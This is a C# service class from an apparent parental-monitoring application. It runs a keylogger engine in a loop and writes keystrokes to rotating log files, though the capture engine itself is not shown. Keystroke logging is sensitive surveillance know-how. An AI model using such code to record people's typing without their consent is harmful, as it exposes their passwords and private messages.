namespace ParentalSight.Core.Keylogger
{
    using Microsoft.Extensions.Logging;
    using ParentalSight;
    using ParentalSight.Common.Builders;
    using ParentalSight.Keylogger.Engines;
    using System;
    using System.IO;
    using System.Threading;
    using System.Threading.Tasks;

    internal class KeyloggerService : IKeyloggerService
    {
        private readonly IKeyloggerOptions _options;
        private readonly ILogger<KeyloggerService> _logger;

        public KeyloggerService(IKeyloggerOptions options, ILogger<KeyloggerService> logger)
        {
            _options = options;
            _logger = logger;
        }

        public Task StartAsync(CancellationToken stoppingToken)
        {
            // TODO: Move to central point which also includes ther logged in users name
            if (!Directory.Exists(_options.OutputPath))
            {
                Directory.CreateDirectory(_options.OutputPath);
            }

            while (!stoppingToken.IsCancellationRequested)
            {
                try
                {
                    _logger.LogInformation("KeyloggerService : Worker running at: {time}", DateTimeOffset.Now);
                    _logger.LogInformation("KeyloggerService : Output path: {path}", _options.OutputPath);

                    var log = new FilenameBuilder()
                        .WithPrefix("logger-")
                        .WithExtension("log")
                        .Build();
                    _logger.LogInformation("KeyloggerService : Filename: {filename}", log);

                    var filepath = Path.Combine(_options.OutputPath, log);
                    var engine = new KeyboardLoggerEngine(filepath);

                    var loggerFileWriteExpiration = DateTime.Now.AddMilliseconds(_options.LogRotationInMilliseconds);
                    engine.StartKeylogger(loggerFileWriteExpiration);
                }
                catch (Exception ex)
                {
                    _logger.LogError("KeyloggerService : {type} {message}\n{stackTrace}", ex.GetType().Name, ex.Message, ex.StackTrace);
                    if (ex.InnerException != null)
                    {
                        _logger.LogError("KeyloggerService : {type} {message}\n{stackTrace}",
                            ex.InnerException.GetType().Name, ex.InnerException.Message, ex.InnerException.StackTrace);
                    }
                }
            }

            return Task.CompletedTask;
        }
    }
}